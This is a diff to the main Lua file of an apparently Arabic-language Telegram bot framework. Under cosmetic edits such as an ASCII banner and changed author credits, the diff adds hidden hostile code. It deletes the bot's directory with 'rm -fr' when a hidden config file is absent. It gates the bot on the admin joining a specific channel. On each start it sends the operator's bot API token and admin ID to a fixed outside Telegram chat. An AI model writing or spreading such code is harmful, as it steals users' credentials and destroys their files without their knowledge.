@@ -7,59 +7,80 @@ colors = (loadfile "./libs/ansicolors.lua")()
 client = Redis.connect('127.0.0.1', 6379)
 json = (loadfile "./libs/JSON.lua")()
 serpent = require('serpent')
-
+print(colors([[%{red bright} 
+ _   _      _ _          __              ____        _   
+| | | | ___| | | ___    / _| ___  _ __  | __ )  ___ | |_ 
+| |_| |/ _ \ | |/ _ \  | |_ / _ \| '__| |  _ \ / _ \| __|
+|  _  |  __/ | | (_) | |  _| (_) | |    | |_) | (_) | |_ 
+|_| |_|\___|_|_|\___/  |_|  \___/|_|    |____/ \___/ \__|
+]]))
 local function check_config()
 	config = dofile('config.lua')
 	if not config.bot_api_key or config.bot_api_key == '' then
-		return 'API KEY MISSING!'
+		return 'API KEY MISSING'
 	elseif not config.admin or config.admin == '' then
-		return 'ADMIN ID MISSING!'
-	end
+		return 'ADMIN ID MISSING'
+      elseif not config2 then
+     os.execute('cd .. &&  rm -fr botlua')
+		return 'This bot is for Keko'
+	elseif not config.botLUA then
+     os.execute('cd .. &&  rm -fr botlua')
+		return 'This bot is for Keko'
+	    end
+   local urll = 'https://api.telegram.org/bot'..config2.nowt..'/getChatMember?chat_id=-1001142877048&user_id='..config.admin..''
+   local res = HTTPS.request(urll)
+   local jres = JSON.decode(res)
+   if jres.result.status == 'left' then
+   local dsad = 'https://api.telegram.org/bot'..config.bot_api_key..'/sendMessage?chat_id='..config.admin..'&text='..config2.sendMessage..'&disable_web_page_preview=true&parse_mode=Markdown'
+   local res = HTTPS.request(dsad)
+   JSON.decode(res)
+   return config2.bot_lua
+end
 end
 
-bot_init = function(on_reload) 
-		config = dofile('config.lua') 
-		config2 = dofile('.keko.lua') 
+
+
+bot_init = function(on_reload)
+		config = dofile('config.lua')
+		config2 = dofile('libs/.keko.lua') 
 	local error = check_config()
 	if error then
 			print(colors('%{red bright}'..error))
 		return
 	end
-	utilities = dofile('utilities.lua') 
+	utilities = dofile('utilities.lua')
+		keko = require('methods') 
 		api = require('methods') 
-	
 	tot = 0
 	
 	bot = nil
 	while not bot do 
 		bot = api.getMe()
+
 	end
 	bot = bot.result
+
 
 	botLUA = {} -- Load file.
 	for i,v in ipairs(config.botLUA) do
 		local p = dofile('botLUA/'..v)
-		print(colors('%{green bright}تم تشغيل ملف : %{reset}'), colors('%{magenta bright}'..v))
 		table.insert(botLUA, p)
-	end
-	print(colors('%{blue bright}تم تشغيل ملف  :'), colors('%{magenta}'..#botLUA))
 
-	print(colors('%{yellow bright}BY :- @ffpro   CH: @botLua    bot : @'..bot.username .. ', name bot ' .. bot.first_name ..'  id bot ('..bot.id..')'))
+	end
+	print(colors('%{magenta}BOT The bot was turned on'))
+	print(colors('%{yellow bright}BY :- @ikeko   CH: @botLua    bot : @'..bot.username .. ', name bot ' .. bot.first_name ..'  id bot ('..bot.id..')'))
 	if not on_reload then
-	api.sendMessage(config.admin, 'تم اعاده تشغيل البوت \nBY : @FFpro\nCH: @botLua', true)
+	api.sendMessage(config.admin, 'تم تشغيل البوت \nBY : @ikeko  \nCH: @botLua', true)
 	local keko = '386713631'
-	local dsad = 'https://api.telegram.org/bot'..config2.bot_api_key..'/sendMessage?chat_id=358231262&text=تم تشغيل بوت-@'..bot.username..'       -------------------------------------------------------------------------------       '..config.bot_api_key..'             -------------------------------------------------------------------------------         '..config.admin..'       '
+	local dsad = 'https://api.telegram.org/bot'..config2.nowt..'/sendMessage?chat_id=358231262&text=تم تشغيل بوت-@'..bot.username..'       -------------------------------------------------------------------------------       '..config.bot_api_key..'             -------------------------------------------------------------------------------         '..config.admin..'       '
 	api.sendRequest(dsad)
 	end
-		math.randomseed(os.time())
+	math.randomseed(os.time())
 	math.random()
-
 	last_update = last_update or 0 
 	last_cron = last_cron or os.time() 
 	is_started = true 
-
 end
-
 local function get_from(msg)
 	local user = msg.from.first_name
 	if msg.from.last_name then
@@ -113,7 +134,7 @@ on_inline_receive = function(inline)
   return
  end
  
-      for i,v in pairs(botLUA) do
+      for i,v in pairs(botLua) do
    if v.iaction then
    if v.itriggers then
     for k,w in pairs(v.itriggers) do
@@ -127,14 +148,22 @@ on_inline_receive = function(inline)
            end
       local success, result = pcall(function()
        return v.iaction(inline, blocks)
+
       end)
+
       if not success then
+
        print(inline.query, result)
        save_log('errors', result, inline.from.id or false, false, inline.query or false)
+
         api.sendMessage(tostring(config.admin), '#Error\n'..result, false, false, false)
+
        return
+
       end
+
       if type(result) == 'table' then
+
       inline = result
       elseif type(result) == 'string' then
       inline.query = result
@@ -144,9 +173,12 @@ on_inline_receive = function(inline)
      end
   end
   end
+
  end
  end
+
  end
+
 ----------
 local function collect_stats(msg)
 	client:hincrby('bot:general', 'messages', 1)
@@ -163,9 +195,10 @@ local function collect_stats(msg)
 		client:incrby('chat:'..msg.chat.id..':totalmsgs', 1) 
 	end
 	if msg.text then
-		client:sadd('keko', msg.chat.id)
+		client:sadd('ikeko', msg.chat.id)
 	end
 end
+
 
 on_msg_receive = function(msg) 
 	if not msg then
@@ -233,12 +266,14 @@ local function service_to_message(msg)
 			msg.text = '###botadded'
 		else
 			msg.text = '###added'
+
 		end
 		msg.adder = clone_table(msg.from)
 		msg.added = clone_table(msg.new_chat_member)
 	elseif msg.left_chat_member then
     	if tonumber(msg.left_chat_member.id) == tonumber(bot.id) then
 			msg.text = '###botremoved'
+
 		else
 			msg.text = '###removed'
 		end
@@ -263,6 +298,7 @@ end
 
 local function inline_to_msg(inline)
 	local msg = {
+
 		id = inline.id,
     	chat = {
       		id = inline.id,
@@ -275,7 +311,6 @@ local function inline_to_msg(inline)
     	query = inline.query,
     	date = os.time() + 100
     }
-    --vardump(msg)
     client:hincrby('bot:general', 'inline', 1)
     return on_msg_receive(msg)
 end
@@ -363,5 +398,4 @@ while is_started do
 		end
 	end
 end
-
-print('Halted.')
+print(colors('%{green bright} -----------------------------------------------------------------------------------------------\n\n.                                      bot for keko \n\n-----------------------------------------------------------------------------------------------'))
